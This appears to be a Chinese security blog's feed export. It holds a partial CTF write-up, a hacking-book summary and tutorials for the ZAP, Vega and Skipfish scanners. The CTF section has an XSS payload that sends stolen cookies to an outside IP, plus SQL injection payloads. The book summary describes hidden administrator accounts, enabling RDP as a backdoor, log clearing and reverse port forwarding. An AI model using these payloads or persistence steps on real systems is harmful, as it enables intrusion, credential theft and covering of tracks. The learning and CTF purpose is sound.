alt=""><br>考察php的弱类型和数组绕过基础，都是恨经典的题<br>这道题不能用弱类型绕过，但是可以用数组导致md5()函数报错返回空，空===空符合条件，得到Flag。<br>param1[]=1&amp;param2[]=2<br>第三关<br>这道题可以用hash碰撞解决，字符串：</p><pre><code>param1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Apparam2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803252223_324.png" alt=""></p><blockquote><p>另外还有一种方式可以把三关过掉就是使用md5碰撞</p></blockquote><pre><code>param1=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0Aj%18%B5%C3Q%0C%9A%82%CE%27%A4Cf%40%B1%FC%D6%DC%8D%DF%05%EB%B9%DF%5B%18%88%D4%A6%05%956%BC%EC-%3E%90%0F%26%FA%2C%AA%21%25%20g%A7%DB%EA%DB%89%05%A7%07%0D%14dS%20S%FB%90%B5%8A%C4T%E5%B2L%20%95%1C6%CD%17N%CE-%80%7B%9C%1E%8DN%26%1A%3A%11%BA%9E%B4%11%BD%04%99%0F%E1%9D%C4%D3%E2%D8%9E%B8%E6%7F%B3%E9%06&amp;param2=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0A%EA%18%B5%C3Q%0C%9A%82%CE%27%A4Cf</code></pre><p>##welcome<br>改名.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260100_207.png" alt=""><br>放入stegsolve<br>stereogram slover移位操作<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260104_53.png" alt=""><br>offset 80</p><h2 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201803261418_523.png" alt=""><br>发现js有rpo漏洞，其中内容可由编写的文章成为js。<br>参考文章：blog.nsfocus.net/rpo-attack/<br><a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p><p><a href="http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f</a></p><p>提示是Try to get the cookie of path “/QWB_fl4g/QWB/”获取目录下的cookie<br>所以先获取了一下cookie，发现没有flag</p><pre><code>b=document.cookie;a=&quot;&lt;img src=//115.29.36.83:23338/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);</code></pre><p>但是有提示是Try to get the cookie of path “/QWB_fl4g/QWB/“</p><p>那就是获取目录下的cookie</p><pre><code>var i = document.createElement(&quot;iframe&quot;);i.setAttribute(&quot;src&quot;, &quot;/QWB_fl4g/QWB/&quot;);document.body.appendChild(i);i.addEventListener( &quot;load&quot;, function(){  var content = i.contentWindow.document.cookie;  location=&#39;//115.29.36.83:23338/&#39;+btoa(content);}, false);</code></pre><p>再利用eval包含住String.fromCharCode即可，payload长度还有些限制。</p><p>QWB{flag_is_f43kth4rpo}</p><h2 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>发现可以爆破<br>所以写如下脚本</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff    i = (R &amp; mask) &amp; 0xffffff    lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1    output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag     mask = 0b1010011000100011100    f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):    tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(524288, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>爆破得到<br>481387<br><code>flag{1110101100001101011}</code></p><h2 id="streamgame2"><a href="#streamgame2" class="headerlink" title="streamgame2"></a>streamgame2</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>与上一道题相似脚本如下</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff     i = (R &amp; mask) &amp; 0xffffff     lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1     output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag      mask = 0x100002     f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):          tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(0b111111111111111111111 \+ 1, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>flag{110111100101001101001}</p><h2 id="Three-hit-Web"><a href="#Three-hit-Web" class="headerlink" title="Three hit    Web"></a>Three hit    Web</h2><p>注册将用户名，密码，年龄写入数据库，登录过后将年龄显示出来<br>思路：每次注册一个用户，注入点放进age，登录查看</p><p>注册提交age显示只能为数字，age用16进制提交，16进制提交不会对%23url解码，所以用–代替</p><p>payload:</p><pre><code>username=Str3am1&amp;age=0x2d3636363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c322c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/j0mydok06kpm0m5gailch3p9l7.png" alt=""></p><p>因为每次都会将年龄写入数据库里面，所以每次都需要修改年龄的值</p><pre><code>username=Str3am11&amp;age=0x2d36363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167292c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/72x5eade9sy8pewomdvy5w0yq4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#第二届强网杯-部分wp&lt;/p&gt;
&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;flag{welcome_to_qwb}&lt;/p&gt;
&lt;h2 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>黑客攻防web安全实战详解</title>
    <link href="http://0xmj.club/2018/02/27/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2web%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    <id>http://0xmj.club/2018/02/27/黑客攻防web安全实战详解/</id>
    <published>2018-02-27T11:57:12.000Z</published>
    <updated>2018-02-27T11:57:48.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑客攻防web安全实战详解"><a href="#黑客攻防web安全实战详解" class="headerlink" title="黑客攻防web安全实战详解"></a>黑客攻防web安全实战详解</h1><p><img src="http://oy0tigw51.bkt.clouddn.com/201801051020_332.png" alt=""></p><h2 id="第一章：网络基础"><a href="#第一章：网络基础" class="headerlink" title="第一章：网络基础"></a>第一章：网络基础</h2><p>###计算机网络<br>IP协议和TCP/IP模型<br>ip地址一般为点分十进制，4段，例如192.168.1.1<br>cmd——&gt;ipconfig 查询本机ip地址</p><p>###端口<br>范围在0-65535<br>21端口：FTP服务<br>23端口：Telnet（远程登录）服务<br>25：SMTP发送邮件<br>80：HTTP<br>109、110：POP2，POP3.<br>135：RPC<br>137：NetBIOS<br>3389：远程桌面服务端口<br>5632：远程软件<br>8080：同80用于WWW代理服务</p><p>cmd——&gt;netstat -on可查看本机开放的端口</p><p>Web服务3种协议<br>HTTP-GET 和    HTTP-POST SOAP(XML web service最常用到的) </p><h2 id="第二章：信息搜索与社会工程"><a href="#第二章：信息搜索与社会工程" class="headerlink" title="第二章：信息搜索与社会工程"></a>第二章：信息搜索与社会工程</h2><p>whois查询域名的ip和所有者信息的传输协议<br>SEO综合查询  <a href="http://tool.chinaz.com/" target="_blank" rel="external">站长工具</a></p><h3 id="常见的端口扫描技术："><a href="#常见的端口扫描技术：" class="headerlink" title="常见的端口扫描技术："></a>常见的端口扫描技术：</h3><p>TCP connect()扫描<br>TCP SYN 扫描<br>TCP FIN扫描<br>实战端口扫描</p><ol><li><a href="http://tool.chinaz.com/port" target="_blank" rel="external">站长工具</a></li><li>scanport</li></ol><h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3><p>1.wwwscan<br>2.御剑<br>3.safe3wvs</p><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><p>1.APPscan<br>2.x-scan<br>3.nessus<br>4.在线扫描工具scanv<br>5.jsky<br>6.Awvs<br>7.webcruiser</p><h3 id="Googlehack"><a href="#Googlehack" class="headerlink" title="Googlehack"></a>Googlehack</h3><p>www.google.com/intl/xx-hacker 黑客专用入口<br>www.google.com/custom?hl=zh-CN 中文黑客专用信息和资料搜索地址<br>www.google.com/custom?hl=en 英文黑客专用信息和资料搜索地址</p><p>intext或allintext 搜索网站正文<br>intitle或allintitle 搜索网站标题<br>cache搜索缓存内容<br>define 查找关键字的定义<br>filetype：文件名.后缀名   例如：信息安全论文 filetype:doc<br>info搜索网站基本信息<br>inurl或allinurl</p><blockquote><p>inurl: admin/login.asp site:www.sina.con<br>就会搜索这个网站下的包含 admin/login.sap的链接<br>inurl:php?id=    搜索包含:php?id=的链接</p></blockquote><p>intitle 网站标题中包含了查询关键词的网页</p><blockquote><p>[攻防 intitle：实战]</p></blockquote><p>site 指定搜索一个站<br>intext 网站正文</p><blockquote><p>site:xx.com intext:管理<br> site:xx.com intext:manage<br>  site:xx.com intext:admin<br>  site:xx.com intitle:后台<br>   site:xx.com inurl:admin</p></blockquote><p>搜索网站目录<br>index<br>转到父目录<br>to parent directory</p><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><p>一切利用人自身漏洞的行为都属于社会工程学范畴</p><h3 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h3><p>net user test1 123 /add<br>其中test1 为用户名 123为密码</p><p>开启3389端口<br>“REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal””Server /v fDenyTSConnections /t REG_DWORD /d 0 /f”<br>提升用户权限：”net localgroup administrators test1 /add”<br>分别执行这两条命令，或者使用开启3389服务工具</p><h4 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h4><p>方法一：安装远控程序<br>方法二：建立隐蔽的用户，并将远程连接端口3389改为其他端口。<br>在建立用户帐户时，如果在用户名后面加上$符号，就可以建立一个简单的隐藏帐户，如“test$”。<br>在字符界面下执行net user命令，就无法查看到这个帐户，但是在图形界面的“本地用户和组”中仍然可以看到。在入侵了一台主机之后，一般都要想办法给自己留一个后门，而给自己加一个管理员组的帐户则是常用的手法。由于带“$”的帐户容易被发现，于是一些人就在帐户的显示名称上下功夫，建立一个看起来和系统帐户类似的名字来迷惑管理员，如admin、sysadmin、Billgates、root等。</p><pre><code>net user chun$ password /add net localgroup administrators chun$ /add 这样我们就利用“命令提示符”成功得建立了一个用户名为“chun$”，密码为“password”的简单“隐藏账户”，并且把该隐藏账户提升为了管理员权限</code></pre><p>方法三：<br>开始 –&gt; 运行 –&gt; regedit –&gt; 确定<br>依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp<br>分支，其下的”PortNumber”键值所对应的就是端口号，将其修改即可。上面设置完成后，需要再依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp<br>分支，同样将其下的”PortNumber”键值进行更改。<br>比如可以将端口改为13389</p><h4 id="清脚印"><a href="#清脚印" class="headerlink" title="清脚印"></a>清脚印</h4><p>推荐日志清除工具， aio.exe</p><h4 id="跨站脚本利用"><a href="#跨站脚本利用" class="headerlink" title="跨站脚本利用"></a>跨站脚本利用</h4><p>1.死循环</p><pre><code>&lt;script&gt;while(true)alert(&#39;炸死你！&#39;)&lt;/script&gt;</code></pre><p>2.隐藏访问</p><pre><code>&lt;script&gt;window.location.href=&quot;目标网站&quot;&lt;/script&gt;</code></pre><p>3.更加隐蔽访问</p><pre><code>&lt;iframe src=&quot;目标网站&quot; width=&quot;0&quot; height=&quot;0&quot;&gt; &lt;/iframe&gt;</code></pre><p>4.获取cookie</p><pre><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></pre><h3 id="web权限提升"><a href="#web权限提升" class="headerlink" title="web权限提升"></a>web权限提升</h3><p>mstsc进行远程桌面连接</p><p>内网：<br>1.反相连接<br>让远程服务器自己来向本地计算机请求，从而解决无法主动向内部服务器发送数据的问题。<br>lcx.exe是一款著名的反向连接的内网端口映射工具。<br>本机：lcx-listen 51 3389<br>这条命令的作用是将本地的51端口与3389端口开启监听状态，并且使两端互相开启映射<br>服务器：lcx.exe-slave 192.168.49.151 192.168.129 3389<br>这样3389端口服务器就会向51端口服务器请求连接，并且将从51端口获取的数据传给3389端口。</p><h3 id="基于内网的入侵"><a href="#基于内网的入侵" class="headerlink" title="基于内网的入侵"></a>基于内网的入侵</h3><p>局域网(Local Area Network，LAN)是指在某一区域内由多台计算机互联成的计算机组。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能<br>决定局域网的主要技术要素为：网络拓扑，传输介质与介质访问控制方法。</p><h3 id="内网信息刺探"><a href="#内网信息刺探" class="headerlink" title="内网信息刺探"></a>内网信息刺探</h3><h4 id="获取主机网络信息"><a href="#获取主机网络信息" class="headerlink" title="获取主机网络信息"></a>获取主机网络信息</h4><p>ipconfig查询这台主机的主机名物理mac地址 IP地址 网关地址以及DNS服务器和DHCP服务器地址等信息。在获取了主机网卡信息之后，如果该主机处于域中，还可以通过的命令提示符获取域信息。<br>使用net view 显示当前域或工作组中的计算机列表，<br>使用net view /domain[:Domain Name]指定要查看其可用计算机的域，<br>net user /domain 查看域用户列表<br>net group “domain admins” /domain 查看管理组成员<br>net user Administrator/domain 查看域管理员信息<br>net /help或者net ？获取net命令可操作对象<br>获取主机用户密码</p><h4 id="APR攻击"><a href="#APR攻击" class="headerlink" title="APR攻击"></a>APR攻击</h4><p>APR协议可以通过Ip地址获取MAC地址</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;黑客攻防web安全实战详解&quot;&gt;&lt;a href=&quot;#黑客攻防web安全实战详解&quot; class=&quot;headerlink&quot; title=&quot;黑客攻防web安全实战详解&quot;&gt;&lt;/a&gt;黑客攻防web安全实战详解&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://oy0tigw51
      
    
    </summary>
    
      <category term="读书摘要" scheme="http://0xmj.club/categories/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
    
      <category term="黑客攻防web安全实战详解" scheme="http://0xmj.club/tags/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2web%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-QWASP-ZAP/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-QWASP-ZAP/</id>
    <published>2018-02-27T11:54:20.000Z</published>
    <updated>2018-02-27T11:55:35.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-QWASP-ZAP"><a href="#kali渗透测试之Web渗透-扫描工具-QWASP-ZAP" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-QWASP_ZAP"></a>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</h1><p>扫描工具-QWASP_ZAP</p><p>十大安全工具之一，集成性工具，功能完善，而且强大。既可做主动扫描，也可做截断代理。开源免费跨平台，简单易用，体验相对混乱，但在主动扫描方面，相对占优。【kali集成】(主动扫描方面比burp好)</p><pre><code>####建议选择第二项####注意检查更新</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251642_866.jpg" alt=""></p><p>更新与插件安装</p><pre><code>安装插件release和beta【release：成熟版  beta：测试版  alpha：不成熟版】</code></pre><p>截断代理【结合手动爬网】</p><pre><code>默认情况下，代理功能自启动1、启动浏览器代理2、</code></pre><p>2、主动扫描</p><pre><code>一、快速爬网扫描二、直接扫描爬到的内容对于要身份认证才能访问的网页无法进行扫描，需要进行身份认证配置Fuzz二、</code></pre><p>结果分析：</p><pre><code>1、查看Code【200 OK】（）若为302，则是重定向2、查看Size Resp.Header是否不同</code></pre><p>暴力破解：</p><pre><code>API功能【程序接口】~http:/zap/【代理已经指向OWASP_ZAP】</code></pre><p>3、使用方法</p><pre><code>0、Persist Session1.四种模式Mode----safe&lt;protect&lt;standard&lt;ATTACK【小心选择扫描模式】2、升级add-ons3、Scan Profile（扫描策略）    右键-&gt;攻击-&gt;Active Scan    自定义扫描策略4、Anti CSRF Tokens【某些网站为了防止CSRF攻击，每次随机生成Tokens】5、扫描https网站时，出现证书报错，通过导入ssl证书，则不会出现错误6、Scope / Contexts（范围） / filter    #Scope  以相同的策略进行扫描（包含context）    #Contexts7、Http Sessions——default session tokens &amp; site session tokens    Session  Properties  #使用默认Manual已能满足大多数，失效再考虑下面#使用表单进行身份认证#脚本认证Script，需自己编写脚本【有脚本模版】#默认情况下，只认定指定的Session的名，必须手动添加其他Session【如：security】 #显示http Session tab    #用于使用不同用户登录审计，判断是否有越权8、Note / tag【添加各种标签，方便审计】9、Passive scan</code></pre><p>############################################################################################</p><p>#实时截断【注意截断时间，需快速】</p><pre><code>##返回的结果也会拦截</code></pre><p>#显示隐藏域</p><p>###隐藏域在客户端是为了降低客户端对服务端的请求过程，提高速度和用户体验。若服务端没对数据进行检验或检查，可进行价格修改和恶意代码注入等</p><pre><code>#被动扫描规则#爬网域值</code></pre><p>##########################################################################################</p><p>扫描标准流程</p><pre><code>设置代理手动爬网自动爬网     #强制浏览web服务器【有可能发现一些web目录】    #强制目录浏览、强制目录和子目录爬网【有各自的字典】主动扫描【active scan】</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-QWASP-ZAP&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-QWASP-ZAP&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-QWASP_ZAP&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="QWASP_ZAP" scheme="http://0xmj.club/tags/QWASP-ZAP/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-Vega</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Vega/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-Vega/</id>
    <published>2018-02-27T11:51:36.000Z</published>
    <updated>2018-02-27T11:52:13.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Vega"><a href="#kali渗透测试之Web渗透-扫描工具-Vega" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Vega"></a>kali渗透测试之Web渗透-扫描工具-Vega</h1><p>##任务6： WEB扫描工具-Vega</p><p> 纯图形化界面，Java编写的开源web扫描器。两种工作模式：扫描模式和代理模式【主流扫描功能】。用于爬站。处理表单，注入测试等。支持SSL：<a href="http://vega/ca.crt" target="_blank" rel="external">http://vega/ca.crt</a></p><p>专注于应用程序代码方面的漏洞</p><p>Vega<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251348_627.jpg" alt=""></p><pre><code>#基于字典发现网站目录</code></pre><p>代理模式</p><p>被动收集信息，结合手动爬站【即页面中能点击的链接全部点击一遍，能提交数据的地方，全部提交一遍】</p><p>连接到网站外面的链接可以暂时不用管<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_64.jpg" alt=""></p><pre><code>#设置外部代理服务器</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_630.jpg" alt=""></p><pre><code>#删除user-agent尾部的vega字样</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_272.jpg" alt=""></p><pre><code>#设置代理</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_285.jpg" alt=""></p><pre><code>1、setup重置【方便用户初始安装和配置】设置安装完成后，一定要删掉，不能留在服务器。如果权限设置不当，通过非授权访问到，可篡改数据库内容</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_130.jpg" alt=""></p><pre><code>2、提交数据【随便输入，目的：被Vega抓取数据】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_567.jpg" alt=""></p><pre><code>3、URL【?参数=***】在等号后面的值，添加不正常的内容，看返回结果4、view source【服务器端源代码，正常Web application中没有此功能，只为了分析漏洞而提供的功能】5、上传位置【同理：成功与否，无所谓】6、反射性XSS【输入什么内容，就返回什么内容】7、论坛或收集反馈的典型表单页面【】8、phpinfo  #安装PHP后，测试是否能否正常工作 【泄漏大量服务器配置信息】#左边灰白色为页面中存在的链接</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_798.jpg" alt=""></p><pre><code>#部分扫描结果</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_220.jpg" alt=""></p><pre><code>9、事后操作-修改内容重放【在时间失效之前】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_991.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_491.jpg" alt=""></p><pre><code>截断功能【代理方面有所欠缺】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_90.jpg" alt=""><br>扫描模式【切换】</p><pre><code>vega主动，对页面中的内容、参数进行扫描</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_475.jpg" alt=""></p><pre><code>配置1、准备     #定义身份认证信息    1、basic http authentication    #http基本身份认证    2、digest http authentication   #http摘要身份认证    3、NTLM                                 #windows系统账号密码认证【未加入域】    4、macro                                 #基于表单【大部分web应用身份认证】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_2.jpg" alt=""></p><pre><code>        #创建宏</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_704.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_133.jpg" alt=""></p><pre><code>2、开始</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_828.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_280.jpg" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_318.jpg" alt=""></p><pre><code>#查看详细信息console</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_31.jpg" alt=""></p><pre><code>#请求内容的过程</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_181.jpg" alt=""></p><p>https证书加密网站【即其既是一个服务网站，又是一个可信证书颁发机构】的扫描【截断代理】</p><pre><code>签名证书：由权威颁发机构颁发给服务器或者个人用于证明自己身份的东西，默认客户端都是信任的。主要目的是用来加密和保证数据的完整性和不可抵赖性自签名证书：由服务器自己颁发给自己，用于证明自己身份的东西，非权威颁发机构发布，默认客户端都是不信任的，主要目的是用来加密和保证数据的完整性和不可抵赖性,与签名证书相同.创建自签名SSL证书：http://www.cnblogs.com/lihuang/articles/4205540.html也是类似，通过vega作为代理服务器，伪造证书，进行信息劫持，进行但要注意：####当访问网站出现信任报错时，可能是有人伪造了证书【如：百度号称全站https，淘宝、阿里、facebook】查看证书</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251353_9.jpg" alt=""></p><pre><code>#右键 View Page info</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251353_884.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-Vega&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-Vega&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-Vega&quot;&gt;&lt;/a&gt;kali渗透测试之Web渗透
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Vega" scheme="http://0xmj.club/tags/Vega/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-Skipfish</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Skipfish/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-Skipfish/</id>
    <published>2018-02-27T11:49:37.000Z</published>
    <updated>2018-02-27T11:50:16.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Skipfish"><a href="#kali渗透测试之Web渗透-扫描工具-Skipfish" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Skipfish"></a>kali渗透测试之Web渗透-扫描工具-Skipfish</h1><h2 id="任务8：-skipfish"><a href="#任务8：-skipfish" class="headerlink" title="任务8： skipfish"></a>任务8： skipfish</h2><p>Skipfish是一个命令行模式，以C语言编写的积极的Web应用程序的安全性侦察工具，没有代理模式。 它准备了一个互动为目标的网站的站点地图进行一个递归爬网和基于字典的探头。</p><pre><code>优点：速度比较快【多路单线程，全异步网络I/O，消除内存管理和调度开销，支持启发式自动内容识别】，误报相对低</code></pre><p>使用方式：【<a href="https://my.oschina.net/u/995648/blog/114321】" target="_blank" rel="external">https://my.oschina.net/u/995648/blog/114321】</a></p><pre><code>基本命令使用方式    skipfish -o test http:1.1.1.1   #指定输出目录/路径    #ctrl -c   停止    #空格     显示详细信息</code></pre><p>skipfish -o test http:192.168.57.143/dvwa/<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251434_19.png" alt=""><br>打开根目录下的skipfishtest1/index.html文件即可查看详细信息</p><pre><code>    skipfish -o test @url.txt             #字典文件</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251439_346.png" alt=""><br>        skipfish -o test -S complet.wl -Wa.wl <a href="http://1.1.1.1" target="_blank" rel="external">http://1.1.1.1</a>   #指定集成参数字典，发现隐藏目录</p><pre><code>        #dpkg -L skipfish | grep wl</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251458_169.png" alt=""></p><pre><code>-I （i）：只检查包含‘string’的URL     【适用于大型网站】    skipfish -o test1 -I /dvwa/ http://192.168.57.143/dvwa/-X：不检查包含‘string’的URL   【如：logout】-K：不对指定参数进行fuzz测试-D：跨站点爬另一个域【即目标页面中有另一个域名，则进行扫描】-l：每秒最大请求数-m：每IP最大并发连接数【依据带宽】--config：指定配置文件 【将参数命令写入一个配置文件】</code></pre><p>身份认证【在一种方式不成功的情况下，使用其他方式】</p><pre><code>    skipfish -A user:pass -o test http://1.1.1.1    #基本http身份认证    skipfish  -C &quot;PHPSESSID=&quot; -C &quot;security=&quot; -o test http://1.1.1.1   #</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251505_541.png" alt=""><br>       基于cookie</p><pre><code>    Usename / Password                           #直接提交表单        ep：skipfish -o a --auth-form http://192.168.1.109/dvwa/login.php --auth-form-target http://192.168.1.109/dvwa/login.php   